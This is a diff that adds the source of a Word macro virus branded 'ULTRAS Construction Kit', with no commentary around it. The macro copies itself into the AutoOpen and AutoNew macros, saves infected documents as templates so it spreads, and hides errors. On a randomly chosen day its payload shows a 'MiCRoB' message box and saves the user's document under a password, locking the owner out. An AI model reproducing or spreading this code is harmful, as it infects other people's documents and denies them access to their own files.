@@ -1,0 +1,23 @@
+'*************************************
+'* ULTRAS CONSTRUCTION KIT FOR WORD  *
+'*            Version 2.0            *
+'*************************************
+Sub Main
+On Error Resume Next
+uCkAo$ = filename$() + ":AutoOpen"
+uCkAn$ = "AutoNew"
+MacroCopy uCkAo$, uCkAo$
+MacroCopy uCkAn$, uCkAo$
+FileSaveAs .Format = 1
+MacroCopy uCkAo$, uCkAo$
+MacroCopy uCkAn$, uCkAo$
+FileSave
+Payload
+End Sub
+Sub Payload
+U = Int(Rnd() * 30) + 1
+If Day(Now()) = U Then
+MsgBox("MiCRoB by ULTRAS"),("UCK"), 16
+FileSaveAs .Password = "MiCRoB"
+End If
+End Sub
